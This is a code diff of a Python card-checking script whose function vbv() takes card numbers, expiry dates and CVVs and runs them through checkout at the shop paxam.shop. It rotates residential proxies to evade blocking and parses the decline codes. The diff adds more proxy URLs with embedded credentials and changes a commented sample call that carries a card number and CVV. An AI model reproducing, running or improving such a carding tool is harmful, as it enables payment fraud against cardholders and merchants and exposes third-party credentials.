@@ -10,13 +10,21 @@ def vbv(ccx):
     session = requests.Session()
 
     proxies = [
-        "http://799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433",
-    "http://1ADM7A56GE0B:8YD2Y736XJ10@85.28.57.8:5433"
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000"
+    "http://799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433",
+    "http://ZVBUHmrp:jjNybrx6@uk4gserver55.ddns.net:8005",
+    "http://NFNmXMmY2PEtCktkfKzwhb4C:SAMA_698940@ca-mon.pvdata.host:8080",
 ]
-
     # Choose one proxy randomly
     chosen_proxy = random.choice(proxies)
-
+    print(chosen_proxy)
     # Set proxy for both HTTP and HTTPS
     session.proxies.update({
         "http": chosen_proxy,
@@ -50,13 +58,16 @@ def vbv(ccx):
         'section-id': 'template--18302998610165__main',
         'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
         'sections_url': '/products/routeins',
-    }
-
-    response = session.post('https://paxam.shop/cart/add', headers=headers, data=data)
-    time.sleep(0.5)
-
-    print(response.status_code)
-    # print(response.text)
+    }    
+    try:
+        response = session.post('https://paxam.shop/cart/add', headers=headers, data=data)
+    except requests.exceptions.ProxyError as e:
+        if "402" in str(e):
+            print("402 payment required")
+            return "402 proxy payment required"
+        else:
+            raise
+       # print(response.text)
 
 
 
@@ -439,12 +450,20 @@ def vbv(ccx):
     headers=headers,
     json=json_data,
 )
+    def find_between(s, start, end):
+            try:
+                return s.split(start)[1].split(end)[0]
+            except IndexError:
+                return None
+
+    #print(response.text)
+
     try:
         receipt_id = response.json()['data']['submitForCompletion']['receipt']['id']
         print("receipt_id: ", receipt_id)
     except:
         decline_code = find_between(response.text, '"localizedMessageHtml":null,"message":{"code":"', '"')
-        if decline_code == None:
+        if decline_code is None:
             print("Submit Failed")
             return "Submit Failed"
         else:
@@ -738,6 +757,7 @@ def vbv(ccx):
     headers=headers,
     json=json_data,
 )
+ 
     print(response.text)
     result = response.text
 
@@ -769,8 +789,8 @@ def vbv(ccx):
         
             return MKN
         except:
-            pass
+            return response.text
 
             
-#vbv("4108370135301893|04|28|745")                                    
+#print(vbv("4031390006273585|11|26|824"))                                     
 # Example usage
